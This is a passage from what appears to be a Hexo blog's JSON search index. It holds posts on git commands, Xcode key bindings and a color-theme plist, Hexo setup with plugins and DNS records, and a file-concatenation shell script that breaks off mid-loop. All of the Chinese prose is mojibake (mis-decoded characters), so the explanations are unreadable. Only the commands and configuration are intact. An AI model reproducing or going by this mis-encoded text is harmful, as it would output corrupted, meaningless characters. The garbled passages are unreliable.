--tagså¯ä»¥æ¨é€å…¨éƒ¨æœªæ¨é€è¿‡çš„æœ¬åœ°æ ‡ç­¾ï¼›\n\nå‘½ä»¤git tag -d <tagname>å¯ä»¥åˆ é™¤ä¸€ä¸ªæœ¬åœ°æ ‡ç­¾ï¼›\n\nå‘½ä»¤git push origin :refs/tags/<tagname>å¯ä»¥åˆ é™¤ä¸€ä¸ªè¿œç¨‹æ ‡ç­¾ã€‚\n\n### 1.3 git åˆå¹¶ commit\n\n```\ngit rebase -i \"åˆå¹¶å‰ä¸€ä¸ªç‰ˆæœ¬å·\"// åˆå¹¶å‰ä¸€ä¸ª ç‰ˆæœ¬å·\n\n\tpick æ˜¯ç”¨commit\n\tsquash æ˜¯åˆå¹¶å‰ä¸€ä¸ª\n\n:wq é€€å‡ºä¿®æ”¹åˆå¹¶åçš„ commit log\n\ngit rebase --abort å¦‚æœå‡ºç°å¤±è¯¯æ¥æ’¤é”€\n```\n\n\n\n# 2. git åˆ†æ”¯\n\n### 2.1 git åˆ†æ”¯ä¿®æ”¹åå­—\n\n```bash\ngit branch -m åŸå æ–°å\n```\n\n### 2.2  git æ‰¹é‡åˆ é™¤åˆ†æ”¯ \n\n```bash\ngit branch | grep \"fea\" | xargs git branch -d\ngit branch | grep \"fix\" | xargs git branch -d\n```\n\n### 2.3 git åˆ†æ”¯æ“ä½œ\n\næŸ¥çœ‹åˆ†æ”¯ï¼šgit branch\n\nåˆ›å»ºåˆ†æ”¯ï¼šgit branch <name>\n\nåˆ‡æ¢åˆ†æ”¯ï¼šgit checkout <name>\n\nåˆ›å»º+åˆ‡æ¢åˆ†æ”¯ï¼šgit checkout -b <name>\n\nåˆå¹¶æŸåˆ†æ”¯åˆ°å½“å‰åˆ†æ”¯ï¼šgit merge <name>\n\nåˆ é™¤åˆ†æ”¯ï¼šgit branch -d <name>\n\n\n\n# 3. git å›æ»š\n\n### 3.1 æ’¤é”€æ–‡ä»¶\n\n+ gitä¿®æ”¹æ–‡ä»¶å, è¿˜æ²¡æœ‰add, commit.  è¿™æ—¶æ’¤é”€æ–‡ä»¶ä¿®æ”¹, å³å›åˆ°ä¸Šä¸€ç‰ˆæœ¬çš„å†…å®¹\n\n```bash\ngit checkout -- file\n```\n\nå‘½ä»¤ä¸­çš„--å¾ˆé‡è¦ï¼Œæ²¡æœ‰--ï¼Œå°±å˜æˆäº†â€œåˆ›å»ºä¸€ä¸ªæ–°åˆ†æ”¯â€çš„å‘½ä»¤ï¼Œæˆ‘ä»¬åœ¨åé¢çš„åˆ†æ”¯ç®¡ç†ä¸­ä¼šå†æ¬¡é‡åˆ°git checkoutå‘½ä»¤ã€‚\n\n+ git add æ–‡ä»¶åæ’¤é”€addæ“ä½œ\n\n```bash\ngit reset HEAD file\n```\n\n### 3.2 æ’¤é”€\n\n+ git push åæ’¤é”€\n\n```\ngit revert <hash> \n```\n\n+ commitæ¶ˆæ¯æ’¤é”€\n\n```\ngit commit --amend -m 'æ–°çš„æ¶ˆæ¯'\n```\n\n+ å›æ»šæ–‡ä»¶çš„æ”¹åŠ¨(æœªæœ‰commit) \n\n```\ngit checkout -- <filename>\n```\n\n+ å›æ»šç‰ˆæœ¬\n\n```\ngit reset --hard <hash>  (--hardå¼ºåˆ¶å†…å®¹å›å½’,å¦‚æœä¿®æ”¹å†…å®¹ä¿ç•™ä¸åŠ æ­¤é€‰é¡¹)\n```\n\n+ åœæ­¢è¿½è¸ªä¸€ä¸ªæ–‡ä»¶\n\nä½ å¶ç„¶æŠŠapplication.logåŠ åˆ°ä»£ç åº“é‡Œäº†ï¼Œç°åœ¨æ¯æ¬¡ä½ è¿è¡Œåº”ç”¨ï¼ŒGitéƒ½ä¼šæŠ¥å‘Šåœ¨application.logé‡Œæœ‰æœªæäº¤çš„ä¿®æ”¹ã€‚ä½ æŠŠ *.logæ”¾åˆ°äº†.gitignoreæ–‡ä»¶é‡Œï¼Œå¯æ–‡ä»¶è¿˜æ˜¯åœ¨ä»£ç åº“é‡Œï¼Œä½ æ€æ ·æ‰èƒ½è®©Gitâ€œæ’¤é”€â€å¯¹è¿™ä¸ªæ–‡ä»¶çš„è¿½è¸ªå‘¢ï¼Ÿ\n\n```\ngit rm --cached application.log\n```\n\n\n\n### 3.3 git å›æ»šç‰ˆæœ¬\n\nåœ¨Gitä¸­ï¼Œç”¨HEADè¡¨ç¤ºå½“å‰ç‰ˆæœ¬,ä¸Šä¸€ä¸ªç‰ˆæœ¬å°±æ˜¯HEAD^,ä¸Šä¸Šä¸€ä¸ªç‰ˆæœ¬å°±æ˜¯HEAD^^,å½“ç„¶å¾€ä¸Š100ä¸ªç‰ˆæœ¬å†™100ä¸ª^æ¯”è¾ƒå®¹æ˜“æ•°ä¸è¿‡æ¥ï¼Œæ‰€ä»¥å†™æˆHEAD~100ã€‚\n\n1. å›æ»šåˆ°ä¸Šä¸€ä¸ªç‰ˆæœ¬\n\n```bash\ngit reset --hard HEAD^\n```\n\n2. å›æ»šåˆ°ä»»æ„ä¸€ä¸ªç‰ˆæœ¬\n\n```bash\ngit reset --hard ç‰ˆæœ¬å·(é€šè¿‡git logæŸ¥çœ‹)\n```\n\n3. å¦‚æœgitå›æ»šåˆ°å†å²ç‰ˆæœ¬å, git logåªèƒ½çœ‹å†å²ç‰ˆæœ¬å†ä»¥å‰çš„ç‰ˆæœ¬å·, ä¸åˆ°æœªæ¥çš„ç‰ˆæœ¬å·æ€ä¹ˆåŠ?\n\n>git æä¾›äº†ä¸€ä¸ªå‘½ä»¤git reflogç”¨æ¥è®°å½•ä½ çš„æ¯ä¸€æ¬¡å‘½ä»¤\n\n\n\n### 3.4 gitå›æ»šæ–‡ä»¶\n\n+ æŸ¥çœ‹æ–‡ä»¶çš„ä¿®æ”¹è®°å½•\n\n```bash\ngit log config.h\n```\n\n+ æŸ¥çœ‹æ–‡ä»¶ç‰ˆæœ¬çš„å·®åˆ«\n\n```bash\ngit diff a3551 fd681 config.h\n```\n\n+  å›é€€åˆ°æŒ‡å®šçš„ç‰ˆæœ¬\n\n```bash\ngit reset fd681 config.h\n```\n\n+  æäº¤åˆ°æœ¬åœ°å‚è€ƒ\n\n```bash\ngit commit -m \"revert old file because commmit have a bug\"   \n```\n\n+ æ›´æ–°åˆ°å·¥ä½œç›®å½•\n\n```bash\ngit checkout config.h   \n```\n\n+ æäº¤åˆ°è¿œç¨‹ä»“åº“\n\n```bash\ngit push origin master  \n```\n\n\n\n### 3.5 è§£å†³å†²çª\n\n1. å»ºè®®æ‰‹åŠ¨è§£å†³å†²çª\n\n2. å‘½ä»¤è¡Œå¯ä»¥ä½¿ç”¨åˆ«äººæˆ–è‡ªå·±çš„ç‰ˆæœ¬\n\n```bash\ngit checkout --theirs/--ours  file\n```\n\n\n\n# 4. git é…ç½®\n\n### 4.1 gitçš„é…ç½®\n\n1. å®‰è£…git\n2. å®‰è£…å®Œæˆåï¼Œéœ€è¦è®¾ç½®è‡ªå·±çš„ç”¨æˆ·åå’Œemailï¼Œåœ¨å‘½ä»¤è¡Œè¾“å…¥ï¼š\n\n```bash\ngit config --global user.name \"levon\"\ngit config --global user.email \"levonfly@gmail.com\"\n```\n\n\n\n### 4.2 gitå’Œç›®å½•ç»‘å®š\n\n1. åœ¨ä¸€ä¸ªç›®å½•é‡Œå¯ä»¥é€šè¿‡git initå‘½ä»¤æŠŠè¿™ä¸ªç›®å½•å˜æˆGitå¯ä»¥ç®¡ç†çš„ä»“åº“,ç„¶åé€šè¿‡ä»¥ä¸‹å‘½ä»¤ç»‘å®šæäº¤çš„åœ°å€\n\n```bash\ngit remote add origin https://github.com/unix2dos/unix2dos.github.io\n```\n\n2. git clone åœ°å€ å°±ä¼šåˆ›å»ºç›®å½•å’Œåœ°å€ç»‘å®š\n\n\n\n### 4.3 github forkåæ›´æ–°æºä»“åº“çš„ä»£ç \n\n```bash\ngit remote add upstream https://github.com/golang/go\ngit remote -v\ngit fetch upstream\ngit merge upstream/master\n```\n\n\n\n### 4.4 git å¢åŠ  è¿œç¨‹ä»“åº“ orgin(åå­—ä¸ä¸€æ ·)\n\n```\ngit remote add github git@github.com:unix2dos/dht.git\ngit push github master\n```\n\n\n\n### 4.5 gitå…¨å±€é…ç½®\n\n+ ä¸­æ–‡ä¸å†æ˜¾ç¤º8è¿›åˆ¶  git statusæ˜¾ç¤ºä¸­æ–‡\n\n```bash\ngit config --global core.quotepath false\n```\n\n+ è®¾ç½®ä»£ç†, å› ä¸ºå›½å†…ä¸€äº›åŸå› ä¸‹è½½çš„å¾ˆæ…¢\n\n```bash\ngit config --global http.proxy 'localhost:8123'\ngit config --global --unset http.proxy\n```\n\n+ gitåŒºåˆ†æ–‡ä»¶å¤§å°å†™\n\ngité»˜è®¤ä¸åŒºåˆ†æ–‡ä»¶å¤§å°å†™,å¯¼è‡´æ–‡ä»¶åæ”¹äº†ä»¥ågitçŠ¶æ€æ²¡æœ‰æ”¹å˜,éœ€è¦è®¾ç½®ä¸€ä¸‹\n\n```\ngit config core.ignorecase false\n```\n\n### 4.6 git lg å®Œç¾æ˜¾ç¤º\n\n```\ngit config --global alias.lg \"log --color --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit\"\n```\n\n\n\n","tags":["git"],"categories":["git"]},{"title":"xcodeè‡ªå®šä¹‰Eclipseä¸­å¸¸ç”¨çš„å¿«æ·é”®","url":"%2Fp%2F30321ed4.html","content":"\n\n\né¦–å…ˆæ‰¾åˆ°Xcodeä¸­çš„è‡ªå¸¦çš„é…ç½®æ–‡ä»¶\n\n```\n/Applications/Xcode.app/Contents/Frameworks/IDEKit.framework/Versions/A/Resources/IDETextKeyBindingSet.plist\n```\nè¿™ä¸ªæ–‡ä»¶é‡Œé…ç½®äº†ä¸€äº›å¯ä»¥è®¾ç½®å¿«æ·é”®çš„æ“ä½œ, ä½¿ç”¨å¸¸ç”¨çš„ç¼–è¾‘å™¨æ‰“å¼€å®ƒï¼ˆéœ€è¦rootæƒé™ï¼‰ã€‚\n\n```\n\t<key>GDI Commands</key>\n\t<dict>\n\t\t<key>GDI Duplicate Current Line</key>\n\t\t<string>selectLine:, copy:, moveToEndOfLine:, insertNewline:, paste:, deleteBackward:</string>\n\t\t<key>GDI Delete Current Line</key>\n\t\t<string>deleteToBeginningOfLine:, moveToEndOfLine:, deleteToBeginningOfLine:, deleteBackward:, moveDown:, moveToBeginningOfLine:</string>\n\t\t<key>GDI Move Current Line Up</key>\n\t\t<string>selectLine:, cut:, moveUp:, moveToBeginningOfLine:, insertNewLine:, paste:, moveBackward:</string>\n\t\t<key>GDI Move Current Line Down</key>\n\t\t<string>selectLine:, cut:, moveDown:, moveToBeginningOfLine:, insertNewLine:, paste:, moveBackward:</string>\n\t\t<key>GDI Insert Line Above</key>\n\t\t<string>moveUp:, moveToEndOfLine:, insertNewline:</string>\n\t\t<key>GDI Insert Line Below</key>\n\t\t<string>moveToEndOfLine:, insertNewline:</string>\n\t</dict>\n```\n<!-- more -->\næŠŠè¿™æ®µé…ç½®æ”¾åˆ°ä¸Šé¢æåˆ°çš„IDETextKeyBindingSet.plisté‡Œï¼Œæ”¾åœ¨æ–‡ä»¶çš„æœ€åçš„è¿™ä¸¤è¡Œä¹‹å‰ï¼š\n</dict>\n</plist>\n\né‡å¯Xcodeï¼Œåœ¨Xcodeèœå•ä¸­ï¼Œæ‰“å¼€Preferencesï¼Œé€‰ä¸­Key Bindingï¼Œåœ¨å³ä¸Šæ–¹æœç´¢GDI, ä¼šå‡ºç°ç±»ä¼¼ä¸‹å›¾çš„æ˜¾ç¤ºï¼Œå¦‚æœæ²¡æœ‰çš„è¯ï¼Œè¯·æ£€æŸ¥ä¸Šé¢çš„æ¯æ­¥æ“ä½œã€‚\n\n","tags":["xcode"],"categories":["xcode"]},{"title":"xcodeä¸»é¢˜","url":"%2Fp%2Fb884c3b7.html","content":"\n\n\n### Xcode ä¸»é¢˜\n\n```\nhttps://github.com/tursunovic/xcode-themes\n```\n\n### elfDark\n\n```\nhttps://code.google.com/archive/p/elf-ios-resource/downloads\n\ncd /Users/liuwei/Library/Developer/Xcode/UserData/FontAndColorThemes æ”¾è¿›å»\n```\n\n\n<!-- more -->\n\n### cat ElfDark.xccolortheme\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n\t<key>DVTConsoleDebuggerInputTextColor</key>\n\t<string>1 0.986905 0.947622 1</string>\n\t<key>DVTConsoleDebuggerInputTextFont</key>\n\t<string>SFMono-Bold - 12.0</string>\n\t<key>DVTConsoleDebuggerOutputTextColor</key>\n\t<string>0 0.923 0.084 1</string>\n\t<key>DVTConsoleDebuggerOutputTextFont</key>\n\t<string>SFMono-Bold - 12.0</string>\n\t<key>DVTConsoleDebuggerPromptTextColor</key>\n\t<string>1 0.036325 0.0717013 1</string>\n\t<key>DVTConsoleDebuggerPromptTextFont</key>\n\t<string>SFMono-Bold - 12.0</string>\n\t<key>DVTConsoleExectuableInputTextColor</key>\n\t<string>0 0.923 0.084 1</string>\n\t<key>DVTConsoleExectuableInputTextFont</key>\n\t<string>SFMono-Bold - 12.0</string>\n\t<key>DVTConsoleExectuableOutputTextColor</key>\n\t<string>1 1 1 1</string>\n\t<key>DVTConsoleExectuableOutputTextFont</key>\n\t<string>SFMono-Bold - 12.0</string>\n\t<key>DVTConsoleTextBackgroundColor</key>\n\t<string>0.109 0.109 0.109 1</string>\n\t<key>DVTConsoleTextInsertionPointColor</key>\n\t<string>0 0.923 0.084 1</string>\n\t<key>DVTConsoleTextSelectionColor</key>\n\t<string>0.416 0.869 1 1</string>\n\t<key>DVTDebuggerInstructionPointerColor</key>\n\t<string>0.705792 0.8 0.544 1</string>\n\t<key>DVTMarkupTextBackgroundColor</key>\n\t<string>0.145 0.145 0.145 1</string>\n\t<key>DVTMarkupTextBorderColor</key>\n\t<string>0.2134 0.2134 0.2134 1</string>\n\t<key>DVTMarkupTextCodeFont</key>\n\t<string>SFMono-Regular - 13.0</string>\n\t<key>DVTMarkupTextEmphasisColor</key>\n\t<string>1 1 1 1</string>\n\t<key>DVTMarkupTextEmphasisFont</key>\n\t<string>.AppleSystemUIFontItalic - 13.0</string>\n\t<key>DVTMarkupTextInlineCodeColor</key>\n\t<string>1 1 1 0.7</string>\n\t<key>DVTMarkupTextLinkColor</key>\n\t<string>0.192442 0.469436 0.928 1</string>\n\t<key>DVTMarkupTextLinkFont</key>\n\t<string>.AppleSystemUIFont - 13.0</string>\n\t<key>DVTMarkupTextNormalColor</key>\n\t<string>1 1 1 1</string>\n\t<key>DVTMarkupTextNormalFont</key>\n\t<string>.AppleSystemUIFont - 13.0</string>\n\t<key>DVTMarkupTextOtherHeadingColor</key>\n\t<string>1 1 1 0.5</string>\n\t<key>DVTMarkupTextOtherHeadingFont</key>\n\t<string>.AppleSystemUIFont - 18.2</string>\n\t<key>DVTMarkupTextPrimaryHeadingColor</key>\n\t<string>1 1 1 1</string>\n\t<key>DVTMarkupTextPrimaryHeadingFont</key>\n\t<string>.AppleSystemUIFont - 31.2</string>\n\t<key>DVTMarkupTextSecondaryHeadingColor</key>\n\t<string>1 1 1 1</string>\n\t<key>DVTMarkupTextSecondaryHeadingFont</key>\n\t<string>.AppleSystemUIFont - 23.4</string>\n\t<key>DVTMarkupTextStrongColor</key>\n\t<string>1 1 1 1</string>\n\t<key>DVTMarkupTextStrongFont</key>\n\t<string>.AppleSystemUIFontBold - 13.0</string>\n\t<key>DVTSourceTextBackground</key>\n\t<string>0.0706522 0.0706522 0.0706522 1</string>\n\t<key>DVTSourceTextBlockDimBackgroundColor</key>\n\t<string>0.109 0.109 0.109 1</string>\n\t<key>DVTSourceTextCurrentLineHighlightColor</key>\n\t<string>0.0609167 0.0946952 0.138587 1</string>\n\t<key>DVTSourceTextInsertionPointColor</key>\n\t<string>0 0.923 0.084 1</string>\n\t<key>DVTSourceTextInvisiblesColor</key>\n\t<string>0.137973 0.380435 0.195417 1</string>\n\t<key>DVTSourceTextSelectionColor</key>\n\t<string>0.0317101 0.166824 0.342391 1</string>\n\t<key>DVTSourceTextSyntaxColors</key>\n\t<dict>\n\t\t<key>xcode.syntax.attribute</key>\n\t\t<string>1 0.904 0.984 1</string>\n\t\t<key>xcode.syntax.character</key>\n\t\t<string>0.921429 0.70068 0.169311 1</string>\n\t\t<key>xcode.syntax.comment</key>\n\t\t<string>0 0.502 0 1</string>\n\t\t<key>xcode.syntax.comment.doc</key>\n\t\t<string>0 0.502 0 1</string>\n\t\t<key>xcode.syntax.comment.doc.keyword</key>\n\t\t<string>0 0.502 0 1</string>\n\t\t<key>xcode.syntax.identifier.class</key>\n\t\t<string>0.355 0.922 0.986 1</string>\n\t\t<key>xcode.syntax.identifier.class.system</key>\n\t\t<string>0.229 0.721 0.887 1</string>\n\t\t<key>xcode.syntax.identifier.constant</key>\n\t\t<string>0.228 0.718 0.882 1</string>\n\t\t<key>xcode.syntax.identifier.constant.system</key>\n\t\t<string>0.228 0.718 0.882 1</string>\n\t\t<key>xcode.syntax.identifier.function</key>\n\t\t<string>0.248 0.78 0.959 1</string>\n\t\t<key>xcode.syntax.identifier.function.system</key>\n\t\t<string>0.227 0.714 0.878 1</string>\n\t\t<key>xcode.syntax.identifier.macro</key>\n\t\t<string>0.218579 0.6826 0.839759 1</string>\n\t\t<key>xcode.syntax.identifier.macro.system</key>\n\t\t<string>0.467 0.881 1 1</string>\n\t\t<key>xcode.syntax.identifier.type</key>\n\t\t<string>0.229 0.721 0.887 1</string>\n\t\t<key>xcode.syntax.identifier.type.system</key>\n\t\t<string>0.222 0.699 0.86 1</string>\n\t\t<key>xcode.syntax.identifier.variable</key>\n\t\t<string>0.23 0.725 0.891 1</string>\n\t\t<key>xcode.syntax.identifier.variable.system</key>\n\t\t<string>0.225 0.707 0.869 1</string>\n\t\t<key>xcode.syntax.keyword</key>\n\t\t<string>1 0.11 0.157 1</string>\n\t\t<key>xcode.syntax.number</key>\n\t\t<string>0.341 0.923 0.326 1</string>\n\t\t<key>xcode.syntax.plain</key>\n\t\t<string>1 1 1 1</string>\n\t\t<key>xcode.syntax.preprocessor</key>\n\t\t<string>0.18956 0.673603 0.983696 1</string>\n\t\t<key>xcode.syntax.string</key>\n\t\t<string>1 0.761311 0.178664 1</string>\n\t\t<key>xcode.syntax.url</key>\n\t\t<string>0.192442 0.469436 0.928 1</string>\n\t</dict>\n\t<key>DVTSourceTextSyntaxFonts</key>\n\t<dict>\n\t\t<key>xcode.syntax.attribute</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.character</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.comment</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.comment.doc</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.comment.doc.keyword</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.class</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.class.system</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.constant</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.constant.system</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.function</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.function.system</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.macro</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.macro.system</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.type</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.type.system</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.variable</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.variable.system</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.keyword</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.number</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.plain</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.preprocessor</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.string</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.url</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t</dict>\n</dict>\n</plist>\n```","tags":["xcode"],"categories":["xcode"]},{"title":"hexoæ­å»ºåšå®¢","url":"%2Fp%2Fb37651.html","content":"\n# 1. å®‰è£…hexo\n\n```bash\napt install npm\nnpm install -g hexo-cli\nmkdir hexo\nhexo init hexo\ncd hexo\n```\n\n<!-- more -->\n\n# 2. hexoé…ç½®\n\n+ å› ä¸ºä¸»ç«™æœ‰ä¸ªé…ç½®, ä¸»é¢˜ä¹Ÿæœ‰ä¸ªé…ç½®, å»ºè®®ä¸¤ä¸ªé…ç½®åˆå¹¶ä¸€èµ·, éœ€è¦Hexoç‰ˆæœ¬åœ¨ 3 ä»¥ä¸Š\n\n+ åœ¨ç«™ç‚¹çš„ `source/_data` ç›®å½•ä¸‹æ–°å»º `next.yml` æ–‡ä»¶ï¼ˆ`_data`ç›®å½•å¯èƒ½éœ€è¦æ–°å»ºï¼‰è¿ç§»ç«™ç‚¹é…ç½®æ–‡ä»¶å’Œä¸»é¢˜é…ç½®æ–‡ä»¶ä¸­çš„é…ç½®åˆ° `next.yml` ä¸­(åŒ…å«äº†`_config.yml`å’Œ`theme.yml`)\n  \n\t```\n\thexo clean --config source/_data/next.yml && hexo g -d --config source/_data/next.yml\n\t```\n\t\n+ ä¸æ¸²æŸ“ README\n\n  å°†skip_renderå‚æ•°çš„å€¼è®¾ç½®ä¸Šã€‚skip_render: README.md\n  ä½¿ç”¨hexo d å‘½ä»¤å°±ä¸ä¼šåœ¨æ¸²æŸ“ README.md è¿™ä¸ªæ–‡ä»¶äº†ã€‚\n\n\n\n# 3. ç»‘å®šåŸŸå\n\n+ ä¸ºè‡ªå·±çš„ github ç”Ÿæˆä¸€ä¸ªå…¬é’¥ç§é’¥å¯¹\n\n+ å»ºç«‹å¸¦ç”¨æˆ·åçš„ä»“åº“ unix2dos.github.io\n\n- CNAME æ”¾åˆ° source æ–‡ä»¶å¤¹, é‡Œé¢å†™ä¸Š www.liuvv.com\n- å‘ä½ çš„ DNS é…ç½®ä¸­æ·»åŠ  3 æ¡è®°å½•\n\n```\n@          A             192.30.252.153\n@          A             192.30.252.154\nwww      CNAME           unix2dos.github.io.\n```\n\n\n\n# 4. hexoæ’ä»¶\n\n```shell\nnpm install hexo --save\nnpm install hexo-deployer-git --save\n\nnpm ls --depth 0  //æŸ¥çœ‹ä¸¢å¤±çš„åŒ…\nnpm install hexo-generator-archive --save //é€ä¸€å®‰è£…ç¼ºå¤±çš„åŒ…\n\n\n### hexo-next ä¸»é¢˜\n\n# ç¬¬ä¸€å°ç”µè„‘\ncd themes\ngit submodule add https://github.com/unix2dos/hexo-theme-next next\ncd next\n\n# ç¬¬äºŒå°ç”µè„‘\ngit submodule update --init\ncd themes/next\n\n# åˆ†äº«æŒ‰é’®\ngit clone https://github.com/theme-next/theme-next-needmoreshare2 source/lib/needsharebutton  \n\n# ä¸å¸¦\ngit clone https://github.com/theme-next/theme-next-canvas-ribbon source/lib/canvas-ribbon\n\n# èœ˜è››ç½‘\ngit clone https://github.com/theme-next/theme-next-canvas-nest source/lib/canvas-nest\n\n# ä¸‰ç§ç‰¹æ•ˆ\ngit clone https://github.com/theme-next/theme-next-three source/lib/three \n\n# ç‰¹æ®Šæ±‰å­—\ngit clone https://github.com/theme-next/theme-next-han source/lib/Han\n\n# å¿«é€Ÿç‚¹å‡»\ngit clone https://github.com/theme-next/theme-next-fastclick source/lib/fastclick\n\n# æ‡’åŠ è½½\ngit clone https://github.com/theme-next/theme-next-jquery-lazyload source/lib/jquery_lazyload\n\n# é¡¶éƒ¨çš„è¿›åº¦\ngit clone https://github.com/theme-next/theme-next-pace source/lib/pace \n\n# å›¾ç‰‡å±•ç¤º\ngit clone https://github.com/theme-next/theme-next-fancybox3 source/lib/fancybox \n\n# æ–‡å­—æ˜¾ç¤ºåŠ ç©ºæ ¼\ngit clone https://github.com/theme-next/theme-next-pangu.git source/lib/pangu\n\n# è¯»å–è¿›åº¦\ngit clone https://github.com/theme-next/theme-next-reading-progress source/lib/reading_progress \n\n\n### hexo-next æ’ä»¶\n\n1. npm install hexo-symbols-count-time --save   # ç»Ÿè®¡å­—æ•°\n\nsymbols_count_time:\n  symbols: true\n  time: true\n  total_symbols: true\n  total_time: true\n  separated_meta: true\n  item_text_post: true\n  item_text_total: false\n  awl: 4\n  wpm: 275\n\n\n2. npm install hexo-abbrlink --save # é“¾æ¥æŒä¹…\n\npermalink: post/:abbrlink.html\nabbrlink:\n  alg: crc16 #support crc16(default) and crc32\n  rep: hex    #support dec(default) and hex\n  \n  \n3. npm install hexo-auto-category --save #è‡ªåŠ¨åˆ†ç±»\n\nauto_category:\n enable: true\n depth:\n \n \n4. npm install hexo-generator-searchdb --save # æœ¬åœ°æœç´¢\n\nsearch:\n  path: search.json\n  field: post\n  format: html\n  limit: 10000\n  content: true\n  \n#ç„¶åæ‰“å¼€æœ¬åœ°local_search\nlocal_search:\n\tenable: true\n  \n\n5. npm install hexo-asset-image --save\npost_asset_folder: true\n```\n\n\n\n### 4.1 ç½®é¡¶\n\nhttps://github.com/netcan/hexo-generator-index-pin-top\n\n\n\n# 5. é—®é¢˜è§£å†³æ–¹æ¡ˆ\n\n### 5.1 ç”Ÿæˆç©ºç™½é¡µ\n\n+ ç”Ÿæˆé¡µé¢å¦‚æœç©ºç™½çš„è¯, æ¢ä¸ªä¸»é¢˜å†é‡æ–°ç”Ÿæˆä¸€æ¬¡\n+ æ›´æ–°ä¸‹ä¸»é¢˜ä»“åº“\n\n### 5.2  WARN No layout\n\nçœ‹çœ‹ä¸»é¢˜é‡Œé¢ç©¶ç«Ÿæœ‰æ²¡æœ‰ä¸œè¥¿,æ–‡ä»¶å¤¹åå­—å’Œä¸»é¢˜æ˜¯å¦å¯¹åº”\n\n### 5.3 ä½¿ç”¨é“¾æ¥æŒä¹…åå›¾ç‰‡æ— æ³•æ˜¾ç¤º\n\n+ https://github.com/rozbo/hexo-abbrlink/issues/19\n\n```javascript\n# vi node_modules/hexo-asset-image/index.js     #24è¡Œ\n\n// var endPos = link.length-1; // æ¢æˆä¸‹é¢çš„è¿™å¥è¯\nvar endPos = link.length-5; //å› ä¸ºæˆ‘çš„permalink: p/:abbrlink.html,  è¿™é‡Œè¦æ”¹æˆ-5\n\n\n// æ­£åˆ™ä¹Ÿè¦æ›¿æ¢\n/*\n/http[s]*.*|\\/\\/.*/.test(src)  \n/^(((http|https|ftp|rtsp|mms)+:\\/{2})|\\/).+/.test(src)\n*/\n```\n\n### 5.4 è¯ä¹¦æ›´æ–°\n\n1. coding\n\n+ æš‚åœdnsè§£ægithub \n+ codingç”³è¯·è¯ä¹¦\n+ å†æ‰“å¼€è§£ægithub\n\n2. github\n\n### 5.5 ä¸»é¢˜æ›´æ–°\n\n+ fork åˆ°è‡ªå·±github, ç”¨æ–°çš„åˆ†æ”¯, ä¿®æ”¹äº†ä¸€äº›language\n+ å®šæœŸåŒæ­¥æœ€æ–°çš„ä»“åº“ä¸»é¢˜\n\n### 5.6 å¤‡æ¡ˆ\n\n+ ICPå¤‡æ¡ˆ\n\n  äº‘æœåŠ¡å™¨è¿›è¡Œ ICP å¤‡æ¡ˆ\n\n+ å…¬å®‰å¤‡æ¡ˆ\n\n  http://www.beian.gov.cn/portal/index.do\n\n  \n\n# 6. å¸¸ç”¨å‘½ä»¤\n\n```html\nhexo clean --config source/_data/next.yml && hexo g -d --config source/_data/next.yml\n\n---\ntitle: \"\"\ndate: 2018-05-19 17:54:46\ntags:\n- golang\n- linux\n---\n\n<!-- more -->\n\n\n![1](Kademlia_DHT_KRPC_BitTorrentåè®®/1.png)\n```\n\n","tags":["hexo"],"categories":["åšå®¢"]},{"title":"shellæ‰¹é‡æ–‡ä»¶å†…å®¹å¤åˆ¶åˆ°ä¸€ä¸ªæ–‡ä»¶å†…","url":"%2Fp%2F875a198.html","content":"\n> å…¬å¸éœ€è¦æŠŠæ‰€æœ‰ä»£ç æ”¾åˆ°ä¸€ä¸ªæ–‡ä»¶å†…,åŠ ä¸Šç‰ˆæƒä¿¡æ¯. äºæ˜¯ç”¨shellç®€å•çš„å¤„ç†äº†ä¸‹\n\n```shell\n#!/bin/sh\n\nNAME=\"a.txt\"\nif [ -f $NAME ]; then\n\t`rm $NAME`\nfi\n\nDIR=\"\"\nFILE=\"\"\nfor file in `ls -R`\ndo\n\tif [ -f $file ]; then\n\t\tif [ $file = \"a.sh\" ];then\n\t\t\tcontinue\t\n\t\tfi\n#\t\techo \"===================== $file begin =====================\" >> $NAME\n#\t\t`cat $file >> $NAME`\n#\t\techo \"===================== $file end =====================\" >> $NAME\n\t\techo $file\t\t\n\telse \n\t\tif  [ ${file:0:1} = \".\" ];then\n\t\t\tDIR=${file/://}\n\t\telse  